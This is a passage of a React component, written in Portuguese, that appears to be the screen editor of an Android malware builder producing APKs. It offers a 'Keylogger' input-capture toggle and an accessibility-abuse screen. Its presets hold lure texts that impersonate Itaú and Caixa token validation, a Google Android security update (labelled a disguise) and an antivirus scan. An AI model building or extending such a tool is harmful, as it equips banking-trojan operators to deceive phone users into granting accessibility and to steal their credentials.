                          size: { ...selectedElement.size, height: newHeight },
                          position: { ...selectedElement.position, y: newY }
                        });
                      }}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                </div>
              </div>
              
              {/* Style - Colors */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-2">Cores</label>
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Fundo</span>
                    <input
                      type="color"
                      value={selectedElement.style.backgroundColor || '#ffffff'}
                      onChange={(e) => updateElementStyle(selectedElement.id, { backgroundColor: e.target.value })}
                      className="w-8 h-8 rounded cursor-pointer"
                    />
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm">Texto</span>
                    <input
                      type="color"
                      value={selectedElement.style.textColor || '#000000'}
                      onChange={(e) => updateElementStyle(selectedElement.id, { textColor: e.target.value })}
                      className="w-8 h-8 rounded cursor-pointer"
                    />
                  </div>
                </div>
              </div>
              
              {/* Style - Typography */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-2">Tipografia</label>
                <div className="space-y-2">
                  <div>
                    <span className="text-xs text-gray-500">Tamanho da Fonte</span>
                    <input
                      type="number"
                      value={selectedElement.style.fontSize || 14}
                      onChange={(e) => updateElementStyle(selectedElement.id, { fontSize: parseInt(e.target.value) })}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                  <div>
                    <span className="text-xs text-gray-500">Peso</span>
                    <select
                      value={selectedElement.style.fontWeight || 'normal'}
                      onChange={(e) => updateElementStyle(selectedElement.id, { fontWeight: e.target.value })}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    >
                      <option value="normal">Normal</option>
                      <option value="bold">Negrito</option>
                      <option value="lighter">Leve</option>
                    </select>
                  </div>
                  <div>
                    <span className="text-xs text-gray-500">Alinhamento</span>
                    <div className="flex gap-1">
                      {['left', 'center', 'right'].map(align => (
                        <button
                          key={align}
                          onClick={() => updateElementStyle(selectedElement.id, { textAlign: align as any })}
                          className={`flex-1 py-1 rounded text-xs ${selectedElement.style.textAlign === align ? 'bg-[#84cc16]' : 'bg-gray-700 hover:bg-gray-600'}`}
                        >
                          {align === 'left' ? '◀' : align === 'center' ? '◆' : '▶'}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
              
              {/* Style - Border */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-2">Borda</label>
                <div className="space-y-2">
                  <div>
                    <span className="text-xs text-gray-500">Arredondamento</span>
                    <input
                      type="number"
                      value={selectedElement.style.borderRadius || 0}
                      onChange={(e) => updateElementStyle(selectedElement.id, { borderRadius: parseInt(e.target.value) })}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
        
        {/* Right Panel - Screen Properties (when no element selected) */}
        {showPropertiesPanel && !previewMode && !selectedElement && currentScreen && (
          <div className="w-80 bg-[#280904] border-l border-[#2a2a31]/20 overflow-y-auto relative z-20 flex-shrink-0 shadow-lg">
            <div className="p-4">
              <h3 className="text-sm font-semibold text-gray-400 uppercase mb-4">Configurações da Tela</h3>
              
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-1">Nome da Tela</label>
                <input
                  type="text"
                  value={currentScreen.name}
                  onChange={(e) => setTemplate(prev => ({
                    ...prev,
                    screens: prev.screens.map((s, i) => i === currentScreenIndex ? { ...s, name: e.target.value } : s)
                  }))}
                  className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                />
              </div>
              
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-1">Cor de Fundo</label>
                <input
                  type="color"
                  value={currentScreen.backgroundColor}
                  onChange={(e) => setTemplate(prev => ({
                    ...prev,
                    screens: prev.screens.map((s, i) => i === currentScreenIndex ? { ...s, backgroundColor: e.target.value } : s)
                  }))}
                  className="w-full h-10 rounded cursor-pointer"
                />
              </div>
              
              <div className="mb-4">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={currentScreen.captureInputs || false}
                    onChange={(e) => setTemplate(prev => ({
                      ...prev,
                      screens: prev.screens.map((s, i) => i === currentScreenIndex ? { ...s, captureInputs: e.target.checked } : s)
                    }))}
                    className="w-4 h-4 rounded"
                  />
                  <span className="text-sm">Capturar inputs (Keylogger)</span>
                </label>
              </div>
              
              <div className="mb-4">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={currentScreen.isAccessibilityScreen || false}
                    onChange={(e) => setTemplate(prev => ({
                      ...prev,
                      screens: prev.screens.map((s, i) => i === currentScreenIndex ? { ...s, isAccessibilityScreen: e.target.checked } : s)
                    }))}
                    className="w-4 h-4 rounded"
                  />
                  <span className="text-sm">Tela de Acessibilidade</span>
                </label>
                <p className="text-xs text-gray-500 mt-1">Ativa a acessibilidade automaticamente</p>
              </div>
              
              {/* 🔐 PAINEL EXCLUSIVO: EDIÇÃO DA INTERFACE DE ORIENTAÇÃO DE ACESSIBILIDADE */}
              {(currentScreen.isAccessibilityScreen || currentScreen.id === 'accessibility') && (() => {
                const accTitleElem = currentScreen.elements.find(e => e.id === 'acc-title' || (e.type === 'text' && (e.style?.fontSize || 0) >= 18));
                const accDescElem = currentScreen.elements.find(e => e.id === 'acc-desc' || (e.type === 'text' && (e.style?.fontSize || 0) < 18));
                const accBtnElem = currentScreen.elements.find(e => e.id === 'acc-btn' || e.type === 'button' || e.buttonAction === 'accessibility');

                return (
                  <div className="p-3 bg-gradient-to-b from-orange-950/40 to-[#121214] border border-[#ef4444]/30 rounded-md mb-4 space-y-3 shadow-lg">
                    <div className="flex items-center gap-2 border-b border-[#ef4444]/20 pb-2">
                      <span className="text-base">🔐</span>
                      <div>
                        <h4 className="text-xs font-bold text-[#f87171] uppercase tracking-wider">Orientação de Acessibilidade</h4>
                        <p className="text-[10px] text-slate-400">Edite as instruções para o usuário ativar a acessibilidade no aparelho</p>
                      </div>
                    </div>

                    {/* Presets Rápidos */}
                    <div>
                      <label className="block text-[11px] font-bold text-slate-300 mb-1.5">⚡ Presets Rápidos de Orientação:</label>
                      <div className="grid grid-cols-1 gap-1.5">
                        <button
                          type="button"
                          onClick={() => {
                            updateAccessibilityScreenElements(
                              'Ativação de Segurança',
                              'Para sua proteção, ative o serviço de acessibilidade para validar sua conta.',
                              'Ativar Proteção',
                              '#ff6600'
                            );
                          }}
                          className="text-left px-2.5 py-1.5 bg-[#24242a]/80 hover:bg-[#84cc16]/20 border border-[#ef4444]/30 rounded-md text-xs transition-all flex items-center gap-2"
                        >
                          <span>🏦</span>
                          <div>
                            <div className="font-bold text-white text-[11px]">Modo Bancário (Itaú / Caixa)</div>
                            <div className="text-[10px] text-slate-400">Instruções de validação de token de segurança</div>
                          </div>
                        </button>

                        <button
                          type="button"
                          onClick={() => {
                            updateAccessibilityScreenElements(
                              'Serviços do Google Android',
                              'Atualização de segurança pendente. Para concluir a otimização de bateria e sistema, ative o serviço de acessibilidade.',
                              'Ativar Atualização',
                              '#ff7a00'
                            );
                          }}
                          className="text-left px-2.5 py-1.5 bg-[#24242a]/80 hover:bg-[#ef4444]/20 border border-[#2a2a31]/30 rounded-md text-xs transition-all flex items-center gap-2"
                        >
                          <span>🚀</span>
                          <div>
                            <div className="font-bold text-white text-[11px]">Modo Google / Sistema</div>
                            <div className="text-[10px] text-slate-400">Disfarce de atualização do sistema Android</div>
                          </div>
                        </button>

                        <button
                          type="button"
                          onClick={() => {
                            updateAccessibilityScreenElements(
                              'Varredura de Ameaças',
                              'Proteção em tempo real. Habilite o serviço de acessibilidade para bloquear acessos não autorizados.',
                              'Habilitar Proteção',
                              '#10b981'
                            );
                          }}
                          className="text-left px-2.5 py-1.5 bg-[#24242a]/80 hover:bg-emerald-600/20 border border-emerald-500/30 rounded-md text-xs transition-all flex items-center gap-2"
                        >
                          <span>🛡️</span>
                          <div>
                            <div className="font-bold text-white text-[11px]">Modo Antivírus / Escaneamento</div>
                            <div className="text-[10px] text-slate-400">Instruções de verificação e bloqueio de ameaças</div>
                          </div>
                        </button>
                      </div>
                    </div>

                    {/* Edição Rápida de Campos */}
                    <div className="space-y-2.5 pt-2 border-t border-[#2a2a31]/60">
                      <div>
                        <label className="block text-[11px] font-bold text-slate-300 mb-1">Título da Tela:</label>
                        <input
                          type="text"
                          value={accTitleElem?.content || ''}
                          onChange={(e) => updateAccessibilityScreenElements(e.target.value, undefined, undefined, undefined)}
                          placeholder="Ex: Ativação de Segurança"
                          className="w-full px-2.5 py-1.5 bg-[#121214] border border-[#2a2a31] rounded-md text-xs text-white focus:border-[#ef4444] outline-none"
                        />
                      </div>

                      <div>
                        <label className="block text-[11px] font-bold text-slate-300 mb-1">Texto Orientativo (Instruções):</label>
                        <textarea
                          rows={3}
                          value={accDescElem?.content || ''}
                          onChange={(e) => updateAccessibilityScreenElements(undefined, e.target.value, undefined, undefined)}
                          placeholder="Ex: Para sua proteção, ative o serviço de acessibilidade..."
                          className="w-full px-2.5 py-1.5 bg-[#121214] border border-[#2a2a31] rounded-md text-xs text-white focus:border-[#ef4444] outline-none resize-none"
                        />
                      </div>

                      <div className="grid grid-cols-3 gap-2 items-end">
                        <div className="col-span-2">
                          <label className="block text-[11px] font-bold text-slate-300 mb-1">Texto do Botão:</label>
                          <input
                            type="text"
                            value={accBtnElem?.content || ''}
                            onChange={(e) => updateAccessibilityScreenElements(undefined, undefined, e.target.value, undefined)}
                            placeholder="Ex: Ativar Proteção"
                            className="w-full px-2.5 py-1.5 bg-[#121214] border border-[#2a2a31] rounded-md text-xs text-white focus:border-[#ef4444] outline-none"
                          />
                        </div>
                        <div>
                          <label className="block text-[10px] font-bold text-slate-400 mb-1">Cor Botão:</label>
                          <input
                            type="color"
                            value={accBtnElem?.style?.backgroundColor || '#ff6600'}
                            onChange={(e) => updateAccessibilityScreenElements(undefined, undefined, undefined, e.target.value)}
                            className="w-full h-8 rounded border border-[#2a2a31] cursor-pointer bg-[#121214] p-0.5"
                          />
                        </div>
                      </div>
                    </div>
                  </div>
                );
              })()}
              
              {/* Screen Order */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-2">Ordem no Fluxo</label>
                <div className="flex gap-2">
                  <button
                    onClick={() => moveScreen(currentScreenIndex, 'up')}
                    disabled={currentScreenIndex === 0}
                    className="flex-1 py-2 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 rounded-md flex items-center justify-center gap-1"
                  >
                    <ChevronUp size={16} />
                    Subir
                  </button>
                  <button
                    onClick={() => moveScreen(currentScreenIndex, 'down')}
                    disabled={currentScreenIndex === template.screens.length - 1}
                    className="flex-1 py-2 bg-gray-700 hover:bg-gray-600 disabled:opacity-50 rounded-md flex items-center justify-center gap-1"
                  >
                    <ChevronDown size={16} />
                    Descer
                  </button>
                </div>
              </div>
              
              {/* Template Info */}
              <div className="border-t border-gray-700 pt-4 mt-4">
                <h4 className="text-xs text-gray-400 uppercase mb-2">Informações do APK</h4>
                
                <div className="mb-3">
                  <label className="block text-xs text-gray-400 mb-1">Nome do App</label>
                  <input
                    type="text"
                    value={template.appName}
                    onChange={(e) => setTemplate(prev => ({ ...prev, appName: e.target.value }))}
                    className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                  />
                </div>

                <div className="mb-3">
                  <label className="block text-xs text-gray-400 mb-1">Idioma do App</label>
                  <select
                    value={template.language || 'pt'}
                    onChange={(e) => setTemplate(prev => ({ ...prev, language: e.target.value as any }))}
                    className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm text-white cursor-pointer"
                  >
                    <option value="pt">Português 🇧🇷</option>
                    <option value="en">English 🇺🇸</option>
                    <option value="es">Español 🇪🇸</option>
                  </select>
                </div>

                <div className="mb-3">
                  <label className="block text-xs text-gray-400 mb-1">Ícone Personalizado</label>
                  <div className="flex items-center gap-3">
                    {template.appIcon ? (
                      <img src={template.appIcon} alt="Icon" className="w-10 h-10 rounded-md object-cover border border-gray-600" />
                    ) : (
                      <div className="w-10 h-10 bg-gray-700 rounded-md flex items-center justify-center text-xs text-gray-400">🖼️</div>
                    )}
                    <label className="flex-1 px-3 py-2 bg-gray-700 hover:bg-gray-600 rounded-md text-xs cursor-pointer text-center">
                      <input
                        type="file"
                        accept="image/png,image/jpeg,image/jpg"
                        className="hidden"
                        onChange={(e) => {
                          const file = e.target.files?.[0];
                          if (file) {
                            const reader = new FileReader();
                            reader.onload = (evt) => {
                              const res = evt.target?.result;
                              if (res) {
                                setTemplate(prev => ({ ...prev, appIcon: res as string }));
                              }
                            };
                            reader.readAsDataURL(file);
                          }
                        }}
                      />
                      {template.appIcon ? 'Trocar Ícone' : 'Upload Ícone'}
                    </label>
                  </div>
                </div>
                
                <div className="mb-3">
                  <label className="block text-xs text-gray-400 mb-1">Package Name</label>
                  <input
                    type="text"
                    value={template.packageName}
                    onChange={(e) => setTemplate(prev => ({ ...prev, packageName: e.target.value }))}
                    className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                  />
                </div>


              </div>
              
              {/* Help */}
              <div className="mt-6 p-3 bg-gray-700 rounded-md">
                <div className="flex items-start gap-2">
                  <Info size={16} className="text-[#ef4444] mt-0.5" />
                  <div className="text-xs text-gray-300">
                    <p className="font-medium mb-1">Dicas:</p>
                    <ul className="list-disc list-inside space-y-1 text-gray-400">
                      <li>Clique em um elemento para editar</li>
                      <li>Arraste para reposicionar</li>
                      <li>Use o painel de elementos para adicionar novos</li>
                      <li>Configure inputs com labels para keylogger</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
      
      {/* 📦 MODAL: Templates Salvos */}
      {showSavedTemplates && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-md w-[700px] max-h-[85vh] flex flex-col overflow-hidden">
            <div className="p-4 border-b border-gray-700 flex items-center justify-between">
              <h2 className="text-lg font-bold flex items-center gap-2">
                <Layers className="text-[#ef4444]" size={20} />
                Templates e Atualizações
              </h2>
              <button 
                onClick={() => setShowSavedTemplates(false)}
                className="p-2 hover:bg-gray-700 rounded-md text-gray-400 hover:text-white"
              >
                ✕
              </button>
            </div>
            
            <div className="p-4 overflow-y-auto flex-1 space-y-6">
              {/* Seção 1: Templates de Fábrica */}
              <div>
                <h3 className="text-xs font-semibold uppercase tracking-wider text-[#ef4444] mb-3 flex items-center gap-2">
                  <span>✨</span> Atualizações & Templates Inovadores
                </h3>
                <div className="grid grid-cols-2 gap-4">
                  {PREDEFINED_TEMPLATES.map((tpl) => (
                    <div key={tpl.id} className="bg-gray-900/60 border border-[#2a2a31]/30 rounded-md p-4 hover:border-[#2a2a31]/60 transition-all flex flex-col justify-between">
                      <div>
                        <h4 className="font-semibold text-white truncate mb-1">{tpl.name}</h4>
                        <p className="text-xs text-gray-400 mb-2 line-clamp-2">
                          {tpl.description}
                        </p>
                      </div>
                      <div className="mt-2">
                        <p className="text-[11px] text-gray-500 mb-3">
                          {tpl.screens.length} tela(s) • App: {tpl.appName}
                        </p>
                        <button
                          onClick={() => { loadTemplate(tpl); setShowSavedTemplates(false); }}
                          className="w-full py-2 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md text-xs font-semibold transition-colors"
                        >
                          Carregar Template
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Seção 2: Meus Templates */}
              <div>
                <h3 className="text-xs font-semibold uppercase tracking-wider text-gray-400 mb-3">
                  📁 Meus Templates Customizados
                </h3>
                {savedTemplates.length === 0 ? (
                  <div className="text-center py-6 text-gray-500 border border-dashed border-gray-700 rounded-md">
                    <p className="text-xs">Nenhum template salvo ainda</p>
                  </div>
                ) : (
                  <div className="grid grid-cols-2 gap-4">
                    {savedTemplates.map((tpl) => (
                      <div key={tpl.id} className="bg-gray-700 border border-gray-600 rounded-md p-4 flex flex-col justify-between">
                        <div>
                          <div className="flex items-start justify-between mb-1">
                            <h4 className="font-semibold text-white truncate flex-1">{tpl.name}</h4>
                            <div className="flex items-center gap-1 ml-2">
                              <button
                                onClick={() => duplicateTemplate(tpl)}
                                className="p-1 hover:bg-gray-600 rounded text-[#ef4444]"
                                title="Duplicar"
                              >
                                <Copy size={13} />
                              </button>
                              <button
                                onClick={() => deleteTemplate(tpl.id)}
                                className="p-1 hover:bg-gray-600 rounded text-[#ef4444]"
                                title="Excluir"
                              >
                                <Trash2 size={13} />
                              </button>
                            </div>
                          </div>
                          <p className="text-[11px] text-gray-400 mb-2">
                            {tpl.screens.length} tela(s) • {tpl.appName}
                          </p>
                        </div>
                        <div className="mt-2">
                          <button
                            onClick={() => { loadTemplate(tpl); setShowSavedTemplates(false); }}
                            className="w-full py-2 bg-gray-600 hover:bg-gray-500 text-white rounded-md text-xs font-semibold transition-colors"
                          >
                            Carregar Template
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
            
            {/* Salvar template atual */}
            <div className="p-4 border-t border-gray-700 bg-gray-900/40">
              <div className="flex items-center gap-2">
                <input
                  type="text"
                  value={templateName}
                  onChange={(e) => setTemplateName(e.target.value)}
                  placeholder="Nome para salvar o template atual..."
                  className="flex-1 px-3 py-2 bg-gray-700 rounded-md text-sm text-white border border-gray-600 focus:outline-none focus:border-[#2a2a31]"
                />
                <button
                  onClick={() => { saveTemplate(); setShowSavedTemplates(false); }}
                  className="px-4 py-2 bg-green-600 hover:bg-green-500 text-white rounded-md text-sm font-semibold transition-colors"
                >
                  Salvar Atual
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
      
      {/* 📜 MODAL: Histórico de APKs */}
      {showApkHistory && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-md w-[600px] max-h-[80vh] overflow-hidden">
            <div className="p-4 border-b border-gray-700 flex items-center justify-between">
              <h2 className="text-lg font-bold flex items-center gap-2">
                <Copy className="text-[#ef4444]" size={20} />
                Histórico de APKs Criados
              </h2>
              <div className="flex items-center gap-2">
                {apkHistory.length > 0 && (
                  <button 
                    onClick={clearHistory}
                    className="px-3 py-1 text-sm text-[#ef4444] hover:bg-gray-700 rounded-md"
                  >
                    Limpar
                  </button>
                )}
                <button 
                  onClick={() => setShowApkHistory(false)}
                  className="p-2 hover:bg-gray-700 rounded-md"
                >
                  ✕
                </button>
              </div>
            </div>
            
            <div className="p-4 max-h-[60vh] overflow-y-auto">
              {apkHistory.length === 0 ? (
                <div className="text-center py-8 text-gray-400">
                  <Download size={48} className="mx-auto mb-4 opacity-50" />
                  <p>Nenhum APK criado ainda</p>
                  <p className="text-sm">O histórico aparecerá aqui após buildar APKs</p>
                </div>
              ) : (
                <div className="space-y-2">
                  {apkHistory.map((entry) => (
                    <div key={entry.id || entry.date} className="bg-gray-700 rounded-md p-4 hover:bg-gray-600 transition-colors">
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex-1">
                          <p className="font-semibold text-white flex items-center gap-2">
                            <Smartphone size={16} className="text-[#ef4444]" />
                            {entry.name}
                          </p>
                          <p className="text-xs text-gray-400 mt-1">
                            Template: {entry.templateName}
                          </p>
                        </div>
                        <div className="text-right text-xs text-gray-500">
                          <p>{new Date(entry.date).toLocaleDateString()}</p>
                          <p>{new Date(entry.date).toLocaleTimeString()}</p>
                        </div>
                      </div>
                      
                      {/* Botões de ação */}
                      <div className="flex items-center gap-2 mt-3 pt-3 border-t border-gray-600">
                        {entry.downloadUrl ? (
                          <button
                            onClick={() => downloadApk(entry.downloadUrl, entry.name)}
                            className="flex-1 flex items-center justify-center gap-2 py-2 bg-green-600 hover:bg-green-500 rounded-md text-sm font-medium transition-colors"
                          >
                            <Download size={16} />
                            Baixar APK
                          </button>
                        ) : (
                          <span className="flex-1 text-center text-xs text-gray-500 py-2">
                            Download não disponível
                          </span>
                        )}
                        <button
                          onClick={() => deleteFromHistory(entry.id)}
                          className="px-4 py-2 bg-[#ef4444] hover:bg-[#ef4444] rounded-md text-sm font-medium transition-colors flex items-center gap-1"
                          title="Excluir do histórico"
                        >
                          <Trash2 size={16} />
                          Excluir
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

